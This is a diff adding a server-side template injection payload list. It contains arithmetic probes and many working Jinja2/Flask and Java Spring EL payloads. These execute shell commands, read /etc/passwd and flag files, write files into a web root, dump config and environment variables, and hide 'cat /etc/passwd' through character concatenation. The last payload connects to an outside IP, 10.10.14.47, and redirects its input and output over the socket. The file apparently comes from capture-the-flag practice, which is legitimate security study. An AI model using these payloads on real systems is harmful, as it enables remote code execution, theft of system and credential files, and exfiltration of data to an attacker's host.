@@ -1,0 +1,57 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+{{7*'7'}}
+${{<%[%'"}}%\.
+${}
+{{}}
+<%= %>
+${7/0}
+{{7/0}}
+<%= 7/0 %>
+${foobar}
+{{foobar}}
+<%= foobar %>
+``
+''
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[229]([\"touch /tmp/testflag\"], shell=True) }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/testflag\").read() }}
+{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("pwd").read() }}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+{{4*4}}[[5*5]]
+{{7*'7'}} would result in 7777777
+{{config.items()}}
+<pre>{% debug %}</pre>
+{{ [].__class__.__base__.__subclasses__() }}
+{{''.__class__.__mro()__[1].__subclasses__()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{"".__class__.__base__.__subclasses__()}}
+{{"".__class__.__mro__[1].__subclasses__()}}
+# __subclasses__()[154] = warning class
+{{"".__class__.__base__.__subclasses__()[154].__init__.__globals__['sys'].modules['os'].popen("pwd").read() }}
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+# write into remote file
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+{{ self.__TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self.__TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self.__TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+# 396 will vary on the application - subprocess class, I think...
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.47\",4464));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
